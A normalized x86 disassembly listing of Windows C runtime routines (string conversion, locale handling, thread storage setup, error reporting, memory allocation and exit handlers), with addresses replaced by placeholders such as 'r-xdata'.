mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1001bddd
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1001da75
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1001d9bb
pop ebp
retn
sub_1001da9f
call sub_10025f3a
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10025f47
pop ecx
push 0x3
call sub_1001edc2
int3
push 0x1
push 0x40000015
push 0x3
call sub_1001e8fa
add esp 0xc
sub_1001dad2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1001daf3
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_1001db52
push 0xc
push r--data
call sub_10020070
push 0xe
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001dbb9
call sub_100200b5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1001a3eb
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1001a3eb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1001dbd0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1001dd6b
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1001dd91
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1001dd6b
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
push 0x3
call sub_1002656e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1002656e
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_1002650b
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_1001cbb0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_1001ea23
push esi
call sub_100264f0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_1002650b
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_100263ae
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_100264f0
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_10026423
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_100263ae
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_10026242
add esp 0xc
jmp r-xdata
sub_1001df40
push 0x3
call sub_1002656e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1001dd91
push 0xff
call sub_1001dd91
pop ecx
pop ecx
push 0x3
call sub_1002656e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1001df79
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10026687
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_1001bd01
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_1001a3eb
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_1001bd01
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_1002405f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10026687
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1001ea23
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_1001a3eb
pop ecx
inc esi
push esi
push eax
call sub_1001bd01
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_1001a3eb
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10026687
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
sub_1001e178
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1001e1ac
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1001a3eb
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001e1e9
push 0x8
push r--data
call sub_10020070
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001e28b
push 0xc
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_1001ee05
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001e294
call sub_100200b5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1001e29d
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1001e178
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1001bd01
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_1001a3eb
pop ecx
xor esi esi
push 0x0
push esi
call sub_1001e1e9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1001e330
push 0x8
push r--data
call sub_10020070
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100200b5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1001a3eb
pop ecx
push 0xd
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1001a3eb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001e44a
push 0xc
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001e456
push esi
call sub_1001a3eb
pop ecx
push edi
call sub_1001ee94
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1001a3eb
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1001ef2d
pop ecx
sub_1001e45f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_1001e330
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1001e4cd
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1001e1ac
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1001e16f
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1001eb94
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_10023e45
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1001e1ac
mov edi [ DecodePointer@IAT ]
push sub_1001e330
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1001bd01
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1001e1e9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1001e6e0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_100267dc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_100267dc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001e72c
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10026807
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10026807
pop ecx
sub_1001e841
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001e869
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_1001bddd
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_1001e841
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_1001e8fa
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_1001a9b0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_10026807
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_10026807
pop ecx
sub_1001ea23
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1001e8fa
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_1001ea48
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001ea23
int3
pop ebp
jmp eax
sub_1001ea85
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_1001eb3f
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1001eb94
mov edi edi
push esi
call sub_1001e166
mov esi eax
push esi
call sub_1001e832
push esi
call sub_1001e8eb
push esi
call sub_1001e125
push esi
call sub_1001adaf
push esi
call sub_10025ee5
push esi
call sub_1001e6cc
add esp 0x18
pop esi
retn
sub_1001ebc7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1001ebeb
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1001feb0
push r--data
push r--data
call sub_1001ebc7
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_100268a0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_10022138
call sub_1001b004
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_100268a0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1001ec82
push 0x20
push r--data
call sub_10020070
push 0x8
call sub_10023fbf
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001edad
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_100200b5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_10023ee6
pop ecx
push [ ebp + 0x8 ]
call sub_1001eb6a
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_1001e166
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_1001e166
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_1001ee05
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1001ee94
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
